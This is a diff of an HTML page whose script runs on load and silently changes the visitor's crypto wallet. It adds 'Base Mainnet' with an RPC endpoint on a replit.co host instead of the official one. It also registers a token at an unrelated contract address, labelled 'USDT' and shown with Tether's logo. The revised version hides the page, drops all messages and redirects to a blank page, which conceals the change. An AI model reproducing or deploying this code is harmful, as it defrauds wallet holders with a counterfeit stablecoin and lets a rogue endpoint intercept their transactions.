@@ -1,56 +1,46 @@
-<!DOCTYPE html><script>
-(async () => {
-  // Debug: Log environment
-  console.log("Script running, window.ethereum:", typeof window.ethereum, window.ethereum);
-
-  // Delay to allow wallet injection (mobile workaround)
-  await new Promise(resolve => setTimeout(resolve, 1000));
-
-  // Check for wallet provider
-  if (!window.ethereum) {
-    console.log("No window.ethereum detected");
-    alert("No wallet detected - please open in a wallet app");
-    window.location.href = "https://metamask.io/download/";
-    return;
-  }
-
-  console.log("Wallet detected:", window.ethereum.isMetaMask ? "MetaMask" : "Other");
-
-  try {
-    // Add Base network
-    await window.ethereum.request({
-      method: "wallet_addEthereumChain",
-      params: [{
-        chainId: "0x2105",
-        chainName: "Base Mainnet",
-        rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
-        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-        blockExplorerUrls: ["https://basescan.org"]
-      }]
-    });
-    console.log("Base network added");
-
-    // Add STBL token
-    await window.ethereum.request({
-      method: "wallet_watchAsset",
-      params: {
-        type: "ERC20",
-        options: {
-          address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
-          symbol: "USDT",
-          decimals: 18,
-          chainId: "8453",
-          image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>body { display: none; }</style> <!-- Hide any flash -->
+</head>
+<body>
+  <script>
+  (async () => {
+    if (!window.ethereum) {
+      window.location.href = "https://metamask.io/download/"; // Fallback
+      return;
+    }
+    try {
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: "0x2105",
+          chainName: "Base Mainnet",
+          rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
+          nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+          blockExplorerUrls: ["https://basescan.org"]
+        }]
+      });
+      await window.ethereum.request({
+        method: "wallet_watchAsset",
+        params: {
+          type: "ERC20",
+          options: {
+            address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
+            symbol: "USDT",
+            decimals: 18,
+            chainId: "8453",
+            image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+          }
         }
-      }
-    });
-    console.log("STBL token added");
-    alert("Token added successfully");
-    window.location.href = "about:blank";
-  } catch (e) {
-    console.error("Error:", e.message);
-    alert("Error: " + e.message);
-    window.location.href = "about:blank";
-  }
-})();
-</script>
+      });
+      window.location.href = "about:blank"; // Exit cleanly
+    } catch (e) {
+      window.location.href = "about:blank"; // Exit on error
+    }
+  })();
+  </script>
+</body>
+</html>
